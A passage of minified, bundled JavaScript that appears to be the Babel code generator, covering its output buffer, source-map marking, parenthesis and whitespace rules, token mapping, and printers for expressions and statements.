Q=this._queue[this._queueCursor-1].char;if(Q!==32&&Q!==9)break;this._queueCursor--}let J=this._sourcePosition;this._pushQueue(X,1,J.line,J.column,J.filename)}queueIndentation(X){if(X===0)return;this._pushQueue(-1,X,void 0,void 0,void 0)}_flush(){let X=this._queueCursor,J=this._queue;for(let Q=0;Q<X;Q++){let Y=J[Q];this._appendChar(Y.char,Y.repeat,Y)}this._queueCursor=0}_appendChar(X,J,Q){if(this._last=X,X===-1){let Y=this._fastIndentations[J];if(Y!==void 0)this._str+=Y;else this._str+=J>1?this._indentChar.repeat(J):this._indentChar}else this._str+=J>1?String.fromCharCode(X).repeat(J):String.fromCharCode(X);if(X!==10)this._mark(Q.line,Q.column,Q.identifierName,Q.identifierNamePos,Q.filename),this._position.column+=J;else this._position.line++,this._position.column=0;if(this._canMarkIdName)Q.identifierName=void 0,Q.identifierNamePos=void 0}_append(X,J,Q){let Y=X.length,W=this._position;if(this._last=X.charCodeAt(Y-1),++this._appendCount>4096)+this._str,this._buf+=this._str,this._str=X,this._appendCount=0;else this._str+=X;if(!Q&&!this._map){W.column+=Y;return}let{column:z,identifierName:G,identifierNamePos:H,filename:U}=J,K=J.line;if((G!=null||H!=null)&&this._canMarkIdName)J.identifierName=void 0,J.identifierNamePos=void 0;let V=X.indexOf(`
`),B=0;if(V!==0)this._mark(K,z,G,H,U);while(V!==-1){if(W.line++,W.column=0,B=V+1,B<Y&&K!==void 0)this._mark(++K,0,null,null,U);V=X.indexOf(`
`,B)}W.column+=Y-B}_mark(X,J,Q,Y,W){var z;(z=this._map)==null||z.mark(this._position,X,J,Q,Y,W)}removeTrailingNewline(){let X=this._queueCursor;if(X!==0&&this._queue[X-1].char===10)this._queueCursor--}removeLastSemicolon(){let X=this._queueCursor;if(X!==0&&this._queue[X-1].char===59)this._queueCursor--}getLastChar(){let X=this._queueCursor;return X!==0?this._queue[X-1].char:this._last}getNewlineCount(){let X=this._queueCursor,J=0;if(X===0)return this._last===10?1:0;for(let Q=X-1;Q>=0;Q--){if(this._queue[Q].char!==10)break;J++}return J===X&&this._last===10?J+1:J}endsWithCharAndNewline(){let X=this._queue,J=this._queueCursor;if(J!==0){if(X[J-1].char!==10)return;if(J>1)return X[J-2].char;else return this._last}}hasContent(){return this._queueCursor!==0||!!this._last}exactSource(X,J){if(!this._map){J();return}this.source("start",X);let Q=X.identifierName,Y=this._sourcePosition;if(Q)this._canMarkIdName=!1,Y.identifierName=Q;if(J(),Q)this._canMarkIdName=!0,Y.identifierName=void 0,Y.identifierNamePos=void 0;this.source("end",X)}source(X,J){if(!this._map)return;this._normalizePosition(X,J,0)}sourceWithOffset(X,J,Q){if(!this._map)return;this._normalizePosition(X,J,Q)}_normalizePosition(X,J,Q){let Y=J[X],W=this._sourcePosition;if(Y)W.line=Y.line,W.column=Math.max(Y.column+Q,0),W.filename=J.filename}getCurrentColumn(){let X=this._queue,J=this._queueCursor,Q=-1,Y=0;for(let W=0;W<J;W++){let z=X[W];if(z.char===10)Q=Y;Y+=z.repeat}return Q===-1?this._position.column+Y:Y-1-Q}getCurrentLine(){let X=0,J=this._queue;for(let Q=0;Q<this._queueCursor;Q++)if(J[Q].char===10)X++;return this._position.line+X}}SF.default=PF});var fF=c((vF)=>{Object.defineProperty(vF,"__esModule",{value:!0});vF.nodes=void 0;var gZ1=U0(),{FLIPPED_ALIAS_KEYS:hZ1,isArrayExpression:yZ1,isAssignmentExpression:$F,isBinary:kF,isBlockStatement:mZ1,isCallExpression:bF,isFunction:u5,isIdentifier:v4,isLiteral:uZ1,isMemberExpression:EG,isObjectExpression:cZ1,isOptionalCallExpression:lZ1,isOptionalMemberExpression:pZ1,isStringLiteral:dZ1}=gZ1;function aJ(X,J){if(!X)return J;if(EG(X)||pZ1(X)){if(aJ(X.object,J),X.computed)aJ(X.property,J)}else if(kF(X)||$F(X))aJ(X.left,J),aJ(X.right,J);else if(bF(X)||lZ1(X))J.hasCall=!0,aJ(X.callee,J);else if(u5(X))J.hasFunction=!0;else if(v4(X))J.hasHelper=J.hasHelper||X.callee&&w6(X.callee);return J}function EF(X){return aJ(X,{hasCall:!1,hasFunction:!1,hasHelper:!1})}function w6(X){if(!X)return!1;if(EG(X))return w6(X.object)||w6(X.property);else if(v4(X))return X.name==="require"||X.name.charCodeAt(0)===95;else if(bF(X))return w6(X.callee);else if(kF(X)||$F(X))return v4(X.left)&&w6(X.left)||w6(X.right);else return!1}function iZ1(X){return uZ1(X)||cZ1(X)||yZ1(X)||v4(X)||EG(X)}var hX=vF.nodes={AssignmentExpression(X){let J=EF(X.right);if(J.hasCall&&J.hasHelper||J.hasFunction)return J.hasFunction?3:2},SwitchCase(X,J){return(!!X.consequent.length||J.cases[0]===X?1:0)|(!X.consequent.length&&J.cases[J.cases.length-1]===X?2:0)},LogicalExpression(X){if(u5(X.left)||u5(X.right))return 2},Literal(X){if(dZ1(X)&&X.value==="use strict")return 2},CallExpression(X){if(u5(X.callee)||w6(X))return 3},OptionalCallExpression(X){if(u5(X.callee))return 3},VariableDeclaration(X){for(let J=0;J<X.declarations.length;J++){let Q=X.declarations[J],Y=w6(Q.id)&&!iZ1(Q.init);if(!Y&&Q.init){let W=EF(Q.init);Y=w6(Q.init)&&W.hasCall||W.hasFunction}if(Y)return 3}},IfStatement(X){if(mZ1(X.consequent))return 3}};hX.ObjectProperty=hX.ObjectTypeProperty=hX.ObjectMethod=function(X,J){if(J.properties[0]===X)return 1};hX.ObjectTypeCallProperty=function(X,J){var Q;if(J.callProperties[0]===X&&!((Q=J.properties)!=null&&Q.length))return 1};hX.ObjectTypeIndexer=function(X,J){var Q,Y;if(J.indexers[0]===X&&!((Q=J.properties)!=null&&Q.length)&&!((Y=J.callProperties)!=null&&Y.length))return 1};hX.ObjectTypeInternalSlot=function(X,J){var Q,Y,W;if(J.internalSlots[0]===X&&!((Q=J.properties)!=null&&Q.length)&&!((Y=J.callProperties)!=null&&Y.length)&&!((W=J.indexers)!=null&&W.length))return 1};[["Function",!0],["Class",!0],["Loop",!0],["LabeledStatement",!0],["SwitchStatement",!0],["TryStatement",!0]].forEach(function([X,J]){[X].concat(hZ1[X]||[]).forEach(function(Q){let Y=J?3:0;hX[Q]=()=>Y})})});var dF=c((pF)=>{Object.defineProperty(pF,"__esModule",{value:!0});pF.AssignmentExpression=IM1;pF.Binary=uF;pF.BinaryExpression=RM1;pF.ClassExpression=LM1;pF.ArrowFunctionExpression=pF.ConditionalExpression=lF;pF.DoExpression=HM1;pF.FunctionExpression=DM1;pF.FunctionTypeAnnotation=WM1;pF.Identifier=PM1;pF.LogicalExpression=CM1;pF.NullableTypeAnnotation=YM1;pF.ObjectExpression=zM1;pF.OptionalIndexedAccessType=KM1;pF.OptionalCallExpression=pF.OptionalMemberExpression=wM1;pF.SequenceExpression=AM1;pF.TSSatisfiesExpression=pF.TSAsExpression=VM1;pF.TSConditionalType=BM1;pF.TSConstructorType=pF.TSFunctionType=OM1;pF.TSInferType=MM1;pF.TSInstantiationExpression=jM1;pF.TSIntersectionType=ZM1;pF.UnaryLike=pF.TSTypeAssertion=cF;pF.TSTypeOperator=FM1;pF.TSUnionType=qM1;pF.IntersectionTypeAnnotation=pF.UnionTypeAnnotation=UM1;pF.UpdateExpression=GM1;pF.AwaitExpression=pF.YieldExpression=NM1;var rZ1=U0(),a9=yX(),{isArrayTypeAnnotation:nZ1,isBinaryExpression:aZ1,isCallExpression:sZ1,isForOfStatement:oZ1,isIndexedAccessType:tZ1,isMemberExpression:yF,isObjectPattern:eZ1,isOptionalMemberExpression:XM1,isYieldExpression:JM1,isStatement:QM1}=rZ1,gF=new Map([["||",0],["??",0],["|>",0],["&&",1],["|",2],["^",3],["&",4],["==",5],["===",5],["!=",5],["!==",5],["<",6],[">",6],["<=",6],[">=",6],["in",6],["instanceof",6],[">>",7],["<<",7],[">>>",7],["+",8],["-",8],["*",9],["/",9],["%",9],["**",10]]);function hF(X,J){if(J==="BinaryExpression"||J==="LogicalExpression")return gF.get(X.operator);if(J==="TSAsExpression"||J==="TSSatisfiesExpression")return gF.get("in")}function $G(X){return X==="TSAsExpression"||X==="TSSatisfiesExpression"||X==="TSTypeAssertion"}var x4=(X,J)=>{let Q=J.type;return(Q==="ClassDeclaration"||Q==="ClassExpression")&&J.superClass===X},f4=(X,J)=>{let Q=J.type;return(Q==="MemberExpression"||Q==="OptionalMemberExpression")&&J.object===X||(Q==="CallExpression"||Q==="OptionalCallExpression"||Q==="NewExpression")&&J.callee===X||Q==="TaggedTemplateExpression"&&J.tag===X||Q==="TSNonNullExpression"};function YM1(X,J){return nZ1(J)}function WM1(X,J,Q){let Y=J.type;return Y==="UnionTypeAnnotation"||Y==="IntersectionTypeAnnotation"||Y==="ArrayTypeAnnotation"||Boolean(Q&a9.TokenContext.arrowFlowReturnType)}function GM1(X,J){return f4(X,J)||x4(X,J)}function mF(X){return Boolean(X&(a9.TokenContext.expressionStatement|a9.TokenContext.arrowBody))}function zM1(X,J,Q){return mF(Q)}function HM1(X,J,Q){return!X.async&&Boolean(Q&a9.TokenContext.expressionStatement)}function uF(X,J){let Q=J.type;if(X.type==="BinaryExpression"&&X.operator==="**"&&Q==="BinaryExpression"&&J.operator==="**")return J.left===X;if(x4(X,J))return!0;if(f4(X,J)||Q==="UnaryExpression"||Q==="SpreadElement"||Q==="AwaitExpression")return!0;let Y=hF(J,Q);if(Y!=null){let W=hF(X,X.type);if(Y===W&&Q==="BinaryExpression"&&J.right===X||Y>W)return!0}return}function UM1(X,J){let Q=J.type;return Q==="ArrayTypeAnnotation"||Q==="NullableTypeAnnotation"||Q==="IntersectionTypeAnnotation"||Q==="UnionTypeAnnotation"}function KM1(X,J){return tZ1(J)&&J.objectType===X}function VM1(X,J){if((J.type==="AssignmentExpression"||J.type==="AssignmentPattern")&&J.left===X)return!0;if(J.type==="BinaryExpression"&&(J.operator==="|"||J.operator==="&")&&X===J.left)return!0;return uF(X,J)}function BM1(X,J){let Q=J.type;if(Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"||Q==="TSTypeOperator"||Q==="TSTypeParameter")return!0;if((Q==="TSIntersectionType"||Q==="TSUnionType")&&J.types[0]===X)return!0;if(Q==="TSConditionalType"&&(J.checkType===X||J.extendsType===X))return!0;return!1}function qM1(X,J){let Q=J.type;return Q==="TSIntersectionType"||Q==="TSTypeOperator"||Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"}function ZM1(X,J){let Q=J.type;return Q==="TSTypeOperator"||Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"}function MM1(X,J){let Q=J.type;if(Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType")return!0;if(X.typeParameter.constraint){if((Q==="TSIntersectionType"||Q==="TSUnionType")&&J.types[0]===X)return!0}return!1}function FM1(X,J){let Q=J.type;return Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSOptionalType"}function jM1(X,J){let Q=J.type;return(Q==="CallExpression"||Q==="OptionalCallExpression"||Q==="NewExpression"||Q==="TSInstantiationExpression")&&!!J.typeParameters}function OM1(X,J){let Q=J.type;return Q==="TSIntersectionType"||Q==="TSUnionType"||Q==="TSTypeOperator"||Q==="TSOptionalType"||Q==="TSArrayType"||Q==="TSIndexedAccessType"&&J.objectType===X||Q==="TSConditionalType"&&(J.checkType===X||J.extendsType===X)}function RM1(X,J,Q){return X.operator==="in"&&Boolean(Q&a9.TokenContext.forInOrInitHeadAccumulate)}function AM1(X,J){let Q=J.type;if(Q==="SequenceExpression"||Q==="ParenthesizedExpression"||Q==="MemberExpression"&&J.property===X||Q==="OptionalMemberExpression"&&J.property===X||Q==="TemplateLiteral")return!1;if(Q==="ClassDeclaration")return!0;if(Q==="ForOfStatement")return J.right===X;if(Q==="ExportDefaultDeclaration")return!0;return!QM1(J)}function NM1(X,J){let Q=J.type;return Q==="BinaryExpression"||Q==="LogicalExpression"||Q==="UnaryExpression"||Q==="SpreadElement"||f4(X,J)||Q==="AwaitExpression"&&JM1(X)||Q==="ConditionalExpression"&&X===J.test||x4(X,J)||$G(Q)}function LM1(X,J,Q){return Boolean(Q&(a9.TokenContext.expressionStatement|a9.TokenContext.exportDefault))}function cF(X,J){return f4(X,J)||aZ1(J)&&J.operator==="**"&&J.left===X||x4(X,J)}function DM1(X,J,Q){return Boolean(Q&(a9.TokenContext.expressionStatement|a9.TokenContext.exportDefault))}function lF(X,J){let Q=J.type;if(Q==="UnaryExpression"||Q==="SpreadElement"||Q==="BinaryExpression"||Q==="LogicalExpression"||Q==="ConditionalExpression"&&J.test===X||Q==="AwaitExpression"||$G(Q))return!0;return cF(X,J)}function wM1(X,J){return sZ1(J)&&J.callee===X||yF(J)&&J.object===X}function IM1(X,J,Q){if(mF(Q)&&eZ1(X.left))return!0;else return lF(X,J)}function CM1(X,J){let Q=J.type;if($G(Q))return!0;if(Q!=="LogicalExpression")return!1;switch(X.operator){case"||":return J.operator==="??"||J.operator==="&&";case"&&":return J.operator==="??";case"??":return J.operator!=="??"}}function PM1(X,J,Q,Y){var W;let z=J.type;if((W=X.extra)!=null&&W.parenthesized&&z==="AssignmentExpression"&&J.left===X){let G=J.right.type;if((G==="FunctionExpression"||G==="ClassExpression")&&J.right.id==null)return!0}if(Y&&Y(X)!==X.name)return!1;if(X.name==="let"){if((yF(J,{object:X,computed:!0})||XM1(J,{object:X,computed:!0,optional:!1}))&&Q&(a9.TokenContext.expressionStatement|a9.TokenContext.forInitHead|a9.TokenContext.forInHead))return!0;return Boolean(Q&a9.TokenContext.forOfHead)}return X.name==="async"&&oZ1(J,{left:X,await:!1})}});var yX=c((aF)=>{Object.defineProperty(aF,"__esModule",{value:!0});aF.TokenContext=void 0;aF.isLastChild=FF1;aF.needsParens=MF1;aF.needsWhitespace=bG;aF.needsWhitespaceAfter=ZF1;aF.needsWhitespaceBefore=qF1;var XF1=fF(),JF1=dF(),QF1=U0(),{FLIPPED_ALIAS_KEYS:YF1,VISITOR_KEYS:WF1,isCallExpression:iF,isDecorator:GF1,isExpressionStatement:zF1,isMemberExpression:HF1,isNewExpression:UF1,isParenthesizedExpression:KF1}=QF1,S10=aF.TokenContext={normal:0,expressionStatement:1,arrowBody:2,exportDefault:4,arrowFlowReturnType:8,forInitHead:16,forInHead:32,forOfHead:64,forInOrInitHeadAccumulate:128,forInOrInitHeadAccumulatePassThroughMask:128};function rF(X){let J=new Map;function Q(Y,W){let z=J.get(Y);J.set(Y,z?function(G,H,U,K){var V;return(V=z(G,H,U,K))!=null?V:W(G,H,U,K)}:W)}for(let Y of Object.keys(X)){let W=YF1[Y];if(W)for(let z of W)Q(z,X[Y]);else Q(Y,X[Y])}return J}var VF1=rF(JF1),BF1=rF(XF1.nodes);function nF(X){if(iF(X))return!0;return HF1(X)&&nF(X.object)}function bG(X,J,Q){var Y;if(!X)return!1;if(zF1(X))X=X.expression;let W=(Y=BF1.get(X.type))==null?void 0:Y(X,J);if(typeof W==="number")return(W&Q)!==0;return!1}function qF1(X,J){return bG(X,J,1)}function ZF1(X,J){return bG(X,J,2)}function MF1(X,J,Q,Y){var W;if(!J)return!1;if(UF1(J)&&J.callee===X){if(nF(X))return!0}if(GF1(J))return!kG(X)&&!(iF(X)&&kG(X.callee))&&!KF1(X);return(W=VF1.get(X.type))==null?void 0:W(X,J,Q,Y)}function kG(X){switch(X.type){case"Identifier":return!0;case"MemberExpression":return!X.computed&&X.property.type==="Identifier"&&kG(X.object);default:return!1}}function FF1(X,J){let Q=WF1[X.type];for(let Y=Q.length-1;Y>=0;Y--){let W=X[Q[Y]];if(W===J)return!0;else if(Array.isArray(W)){let z=W.length-1;while(z>=0&&W[z]===null)z--;return z>=0&&W[z]===J}else if(W)return!1}return!1}});var Xj=c((tF)=>{Object.defineProperty(tF,"__esModule",{value:!0});tF.TokenMap=void 0;var LF1=U0(),{traverseFast:DF1,VISITOR_KEYS:wF1}=LF1;class oF{constructor(X,J,Q){this._tokens=void 0,this._source=void 0,this._nodesToTokenIndexes=new Map,this._nodesOccurrencesCountCache=new Map,this._tokensCache=new Map,this._tokens=J,this._source=Q,DF1(X,(Y)=>{let W=this._getTokensIndexesOfNode(Y);if(W.length>0)this._nodesToTokenIndexes.set(Y,W)}),this._tokensCache=null}has(X){return this._nodesToTokenIndexes.has(X)}getIndexes(X){return this._nodesToTokenIndexes.get(X)}find(X,J){let Q=this._nodesToTokenIndexes.get(X);if(Q)for(let Y=0;Y<Q.length;Y++){let W=Q[Y],z=this._tokens[W];if(J(z,W))return z}return null}findLastIndex(X,J){let Q=this._nodesToTokenIndexes.get(X);if(Q)for(let Y=Q.length-1;Y>=0;Y--){let W=Q[Y],z=this._tokens[W];if(J(z,W))return W}return-1}findMatching(X,J,Q=0){let Y=this._nodesToTokenIndexes.get(X);if(Y){let W=0,z=Q;if(z>1){let G=this._nodesOccurrencesCountCache.get(X);if(G&&G.test===J&&G.count<z)W=G.i+1,Q-=G.count+1}for(;W<Y.length;W++){let G=this._tokens[Y[W]];if(this.matchesOriginal(G,J)){if(Q===0){if(z>0)this._nodesOccurrencesCountCache.set(X,{test:J,count:z,i:W});return G}Q--}}}return null}matchesOriginal(X,J){if(X.end-X.start!==J.length)return!1;if(X.value!=null)return X.value===J;return this._source.startsWith(J,X.start)}startMatches(X,J){let Q=this._nodesToTokenIndexes.get(X);if(!Q)return!1;let Y=this._tokens[Q[0]];if(Y.start!==X.start)return!1;return this.matchesOriginal(Y,J)}endMatches(X,J){let Q=this._nodesToTokenIndexes.get(X);if(!Q)return!1;let Y=this._tokens[Q[Q.length-1]];if(Y.end!==X.end)return!1;return this.matchesOriginal(Y,J)}_getTokensIndexesOfNode(X){if(X.start==null||X.end==null)return[];let{first:J,last:Q}=this._findTokensOfNode(X,0,this._tokens.length-1),Y=J,W=IF1(X);if((X.type==="ExportNamedDeclaration"||X.type==="ExportDefaultDeclaration")&&X.declaration&&X.declaration.type==="ClassDeclaration")W.next();let z=[];for(let G of W){if(G==null)continue;if(G.start==null||G.end==null)continue;let H=this._findTokensOfNode(G,Y,Q),U=H.first;for(let K=Y;K<U;K++)z.push(K);Y=H.last+1}for(let G=Y;G<=Q;G++)z.push(G);return z}_findTokensOfNode(X,J,Q){let Y=this._tokensCache.get(X);if(Y)return Y;let W=this._findFirstTokenOfNode(X.start,J,Q),z=this._findLastTokenOfNode(X.end,W,Q);return this._tokensCache.set(X,{first:W,last:z}),{first:W,last:z}}_findFirstTokenOfNode(X,J,Q){while(J<=Q){let Y=Q+J>>1;if(X<this._tokens[Y].start)Q=Y-1;else if(X>this._tokens[Y].start)J=Y+1;else return Y}return J}_findLastTokenOfNode(X,J,Q){while(J<=Q){let Y=Q+J>>1;if(X<this._tokens[Y].end)Q=Y-1;else if(X>this._tokens[Y].end)J=Y+1;else return Y}return Q}}tF.TokenMap=oF;function*IF1(X){if(X.type==="TemplateLiteral"){yield X.quasis[0];for(let Q=1;Q<X.quasis.length;Q++)yield X.expressions[Q-1],yield X.quasis[Q];return}let J=wF1[X.type];for(let Q of J){let Y=X[Q];if(!Y)continue;if(Array.isArray(Y))yield*Y;else yield Y}}});var Qj=c((Jj)=>{Object.defineProperty(Jj,"__esModule",{value:!0});Jj.TaggedTemplateExpression=CF1;Jj.TemplateElement=PF1;Jj.TemplateLiteral=TF1;Jj._printTemplate=SF1;function CF1(X){this.print(X.tag),this.print(X.typeParameters),this.print(X.quasi)}function PF1(){throw new Error("TemplateElement printing is handled in TemplateLiteral")}function SF1(X,J){let Q=X.quasis,Y="`";for(let W=0;W<Q.length-1;W++)if(Y+=Q[W].value.raw,this.token(Y+"${",!0),this.print(J[W]),Y="}",this.tokenMap){let z=this.tokenMap.findMatching(X,"}",W);if(z)this._catchUpTo(z.loc.start)}Y+=Q[Q.length-1].value.raw,this.token(Y+"`",!0)}function TF1(X){this._printTemplate(X,X.expressions)}});var Gj=c((Wj)=>{Object.defineProperty(Wj,"__esModule",{value:!0});Wj.LogicalExpression=Wj.BinaryExpression=Wj.AssignmentExpression=Wj1;Wj.AssignmentPattern=Yj1;Wj.AwaitExpression=eF1;Wj.BindExpression=Gj1;Wj.CallExpression=oF1;Wj.ConditionalExpression=cF1;Wj.Decorator=nF1;Wj.DoExpression=yF1;Wj.EmptyStatement=Jj1;Wj.ExpressionStatement=Qj1;Wj.Import=tF1;Wj.MemberExpression=zj1;Wj.MetaProperty=Hj1;Wj.ModuleExpression=Vj1;Wj.NewExpression=lF1;Wj.OptionalCallExpression=sF1;Wj.OptionalMemberExpression=aF1;Wj.ParenthesizedExpression=mF1;Wj.PrivateName=Uj1;Wj.SequenceExpression=pF1;Wj.Super=iF1;Wj.ThisExpression=dF1;Wj.UnaryExpression=hF1;Wj.UpdateExpression=uF1;Wj.V8IntrinsicIdentifier=Kj1;Wj.YieldExpression=Xj1;Wj._shouldPrintDecoratorsBeforeExport=rF1;var bF1=U0(),vF1=yX(),{isCallExpression:xF1,isLiteral:Yj,isMemberExpression:vG,isNewExpression:fF1,isPattern:gF1}=bF1;function hF1(X){let{operator:J}=X;if(J==="void"||J==="delete"||J==="typeof"||J==="throw")this.word(J),this.space();else this.token(J);this.print(X.argument)}function yF1(X){if(X.async)this.word("async",!0),this.space();this.word("do"),this.space(),this.print(X.body)}function mF1(X){this.tokenChar(40);let J=this.enterDelimited();this.print(X.expression),J(),this.rightParens(X)}function uF1(X){if(X.prefix)this.token(X.operator),this.print(X.argument);else this.print(X.argument,!0),this.token(X.operator)}function cF1(X){this.print(X.test),this.space(),this.tokenChar(63),this.space(),this.print(X.consequent),this.space(),this.tokenChar(58),this.space(),this.print(X.alternate)}function lF1(X,J){if(this.word("new"),this.space(),this.print(X.callee),this.format.minified&&X.arguments.length===0&&!X.optional&&!xF1(J,{callee:X})&&!vG(J)&&!fF1(J))return;if(this.print(X.typeArguments),this.print(X.typeParameters),X.optional)this.token("?.");if(X.arguments.length===0&&this.tokenMap&&!this.tokenMap.endMatches(X,")"))return;this.tokenChar(40);let Q=this.enterDelimited();this.printList(X.arguments,this.shouldPrintTrailingComma(")")),Q(),this.rightParens(X)}function pF1(X){this.printList(X.expressions)}function dF1(){this.word("this")}function iF1(){this.word("super")}function rF1(X){if(typeof this.format.decoratorsBeforeExport==="boolean")return this.format.decoratorsBeforeExport;return typeof X.start==="number"&&X.start===X.declaration.start}function nF1(X){this.tokenChar(64),this.print(X.expression),this.newline()}function aF1(X){let{computed:J}=X,{optional:Q,property:Y}=X;if(this.print(X.object),!J&&vG(Y))throw new TypeError("Got a MemberExpression for MemberExpression property");if(Yj(Y)&&typeof Y.value==="number")J=!0;if(Q)this.token("?.");if(J)this.tokenChar(91),this.print(Y),this.tokenChar(93);else{if(!Q)this.tokenChar(46);this.print(Y)}}function sF1(X){if(this.print(X.callee),this.print(X.typeParameters),X.optional)this.token("?.");this.print(X.typeArguments),this.tokenChar(40);let J=this.enterDelimited();this.printList(X.arguments),J(),this.rightParens(X)}function oF1(X){this.print(X.callee),this.print(X.typeArguments),this.print(X.typeParameters),this.tokenChar(40);let J=this.enterDelimited();this.printList(X.arguments,this.shouldPrintTrailingComma(")")),J(),this.rightParens(X)}function tF1(){this.word("import")}function eF1(X){this.word("await"),this.space(),this.print(X.argument)}function Xj1(X){if(X.delegate){if(this.word("yield",!0),this.tokenChar(42),X.argument)this.space(),this.print(X.argument)}else if(X.argument)this.word("yield",!0),this.space(),this.print(X.argument);else this.word("yield")}function Jj1(){this.semicolon(!0)}function Qj1(X){this.tokenContext|=vF1.TokenContext.expressionStatement,this.print(X.expression),this.semicolon()}function Yj1(X){if(this.print(X.left),X.left.type==="Identifier"||gF1(X.left)){if(X.left.optional)this.tokenChar(63);this.print(X.left.typeAnnotation)}this.space(),this.tokenChar(61),this.space(),this.print(X.right)}function Wj1(X){if(this.print(X.left),this.space(),X.operator==="in"||X.operator==="instanceof")this.word(X.operator);else this.token(X.operator),this._endsWithDiv=X.operator==="/";this.space(),this.print(X.right)}function Gj1(X){this.print(X.object),this.token("::"),this.print(X.callee)}function zj1(X){if(this.print(X.object),!X.computed&&vG(X.property))throw new TypeError("Got a MemberExpression for MemberExpression property");let J=X.computed;if(Yj(X.property)&&typeof X.property.value==="number")J=!0;if(J){let Q=this.enterDelimited();this.tokenChar(91),this.print(X.property),this.tokenChar(93),Q()}else this.tokenChar(46),this.print(X.property)}function Hj1(X){this.print(X.meta),this.tokenChar(46),this.print(X.property)}function Uj1(X){this.tokenChar(35),this.print(X.id)}function Kj1(X){this.tokenChar(37),this.word(X.name)}function Vj1(X){this.word("module",!0),this.space(),this.tokenChar(123),this.indent();let{body:J}=X;if(J.body.length||J.directives.length)this.newline();this.print(J),this.dedent(),this.rightBrace(X)}});var Bj=c((Kj)=>{Object.defineProperty(Kj,"__esModule",{value:!0});Kj.BreakStatement=rj1;Kj.CatchClause=ej1;Kj.ContinueStatement=nj1;Kj.DebuggerStatement=QO1;Kj.DoWhileStatement=ij1;Kj.ForOfStatement=Kj.ForInStatement=void 0;Kj.ForStatement=pj1;Kj.IfStatement=lj1;Kj.LabeledStatement=oj1;Kj.ReturnStatement=aj1;Kj.SwitchCase=JO1;Kj.SwitchStatement=XO1;Kj.ThrowStatement=sj1;Kj.TryStatement=tj1;Kj.VariableDeclaration=YO1;Kj.VariableDeclarator=WO1;Kj.WhileStatement=dj1;Kj.WithStatement=cj1;var hj1=U0(),{isFor:zj,isForStatement:yj1,isIfStatement:mj1,isStatement:uj1}=hj1;function cj1(X){this.word("with"),this.space(),this.tokenChar(40),this.print(X.object),this.tokenChar(41),this.printBlock(X)}function lj1(X){this.word("if"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.space();let J=X.alternate&&mj1(Hj(X.consequent));if(J)this.tokenChar(123),this.newline(),this.indent();if(this.printAndIndentOnComments(X.consequent),J)this.dedent(),this.newline(),this.tokenChar(125);if(X.alternate){if(this.endsWith(125))this.space();this.word("else"),this.space(),this.printAndIndentOnComments(X.alternate)}}function Hj(X){let{body:J}=X;if(uj1(J)===!1)return X;return Hj(J)}function pj1(X){this.word("for"),this.space(),this.tokenChar(40);{let J=this.enterForStatementInit();this.print(X.init),J()}if(this.tokenChar(59),X.test)this.space(),this.print(X.test);if(this.token(";",!1,1),X.update)this.space(),this.print(X.update);this.tokenChar(41),this.printBlock(X)}function dj1(X){this.word("while"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.printBlock(X)}function Uj(X){this.word("for"),this.space();let J=X.type==="ForOfStatement";if(J&&X.await)this.word("await"),this.space();this.noIndentInnerCommentsHere(),this.tokenChar(40);{let Q=this.enterForXStatementInit(J);this.print(X.left),Q==null||Q()}this.space(),this.word(J?"of":"in"),this.space(),this.print(X.right),this.tokenChar(41),this.printBlock(X)}var v10=Kj.ForInStatement=Uj,x10=Kj.ForOfStatement=Uj;function ij1(X){this.word("do"),this.space(),this.print(X.body),this.space(),this.word("while"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.semicolon()}function g4(X,J){if(J)X.space(),X.printTerminatorless(J);X.semicolon()}function rj1(X){this.word("break"),g4(this,X.label)}function nj1(X){this.word("continue"),g4(this,X.label)}function aj1(X){this.word("return"),g4(this,X.argument)}function sj1(X){this.word("throw"),g4(this,X.argument)}function oj1(X){this.print(X.label),this.tokenChar(58),this.space(),this.print(X.body)}function tj1(X){if(this.word("try"),this.space(),this.print(X.block),this.space(),X.handlers)this.print(X.handlers[0]);else this.print(X.handler);if(X.finalizer)this.space(),this.word("finally"),this.space(),this.print(X.finalizer)}function ej1(X){if(this.word("catch"),this.space(),X.param)this.tokenChar(40),this.print(X.param),this.print(X.param.typeAnnotation),this.tokenChar(41),this.space();this.print(X.body)}function XO1(X){this.word("switch"),this.space(),this.tokenChar(40),this.print(X.discriminant),this.tokenChar(41),this.space(),this.tokenChar(123),this.printSequence(X.cases,!0,void 0,function J(Q,Y){if(!Q&&X.cases[X.cases.length-1]===Y)return-1}),this.rightBrace(X)}function JO1(X){if(X.test)this.word("case"),this.space(),this.print(X.test),this.tokenChar(58);else this.word("default"),this.tokenChar(58);if(X.consequent.length)this.newline(),this.printSequence(X.consequent,!0)}function QO1(){this.word("debugger"),this.semicolon()}function YO1(X,J){if(X.declare)this.word("declare"),this.space();let{kind:Q}=X;if(Q==="await using")this.word("await"),this.space(),this.word("using",!0);else this.word(Q,Q==="using");this.space();let Y=!1;if(!zj(J)){for(let W of X.declarations)if(W.init)Y=!0}if(this.printList(X.declarations,void 0,void 0,X.declarations.length>1,Y?function(W){this.token(",",!1,W),this.newline()}:void 0),zj(J)){if(yj1(J)){if(J.init===X)return}else if(J.left===X)return}this.semicolon()}function WO1(X){if(this.print(X.id),X.definite)this.tokenChar(33);if(this.print(X.id.typeAnnotation),X.init)this.space(),this.tokenChar(61),this.space(),this.print(X.init)}});var Zj=c((qj)=>{Object.defineProperty(qj,"__esModule",{value:!0});qj.ClassAccessorProperty=EO1;qj.ClassBody=SO1;qj.ClassExpression=qj.ClassDeclaration=PO1;qj.ClassMethod=kO1;qj.ClassPrivateMethod=bO1;qj.ClassPrivateProperty=$O1;qj.ClassProperty=_O1;qj.StaticBlock=xO1;qj._classMethodHead=vO1;var wO1=U0(),{isExportDefaultDeclaration:IO1,isExportNamedDeclaration:CO1}=wO1;function 